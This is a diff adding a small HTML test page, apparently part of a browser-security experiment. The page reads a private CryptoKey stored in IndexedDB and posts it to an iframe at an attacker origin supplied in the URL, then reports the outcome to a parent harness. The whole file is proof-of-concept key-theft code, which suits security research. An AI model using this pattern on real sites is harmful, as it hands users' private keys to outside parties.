@@ -1,0 +1,16 @@
+<!doctype html><meta charset="utf-8"><title>hostile site code (same origin as loader)</title>
+<script type="module">
+const ATT = new URLSearchParams(location.search).get('att');
+const out = {};
+try {
+  const db = await new Promise((res, rej) => { const r = indexedDB.open('mw-exp4', 1); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); });
+  const rec = await new Promise((res, rej) => { const r = db.transaction('identity').objectStore('identity').get('me'); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); });
+  out.foundKey = !!rec; 
+  // open attacker origin in a child iframe and hand over the CryptoKey object (structured clone, cross-origin)
+  const f = document.createElement('iframe'); f.src = ATT + '/attacker.html'; document.body.appendChild(f);
+  await new Promise((res) => { addEventListener('message', function h(e) { if (e.data && e.data.kind === 'attacker-ready') { removeEventListener('message', h); res(); } }); });
+  try { f.contentWindow.postMessage({ kind: 'key', key: rec.privateKey }, ATT); out.posted = true; } catch (e) { out.postError = e.name + ': ' + e.message; }
+  out.attacker = await new Promise((res) => { const t = setTimeout(() => res({ timeout: true }), 6000); addEventListener('message', function h(e) { if (e.data && e.data.kind === 'attacker-result') { clearTimeout(t); removeEventListener('message', h); res(e.data.out); } }); });
+} catch (e) { out.error = e.name + ': ' + e.message; }
+parent.postMessage({ kind: 'hostile-result', out }, '*');
+</script>
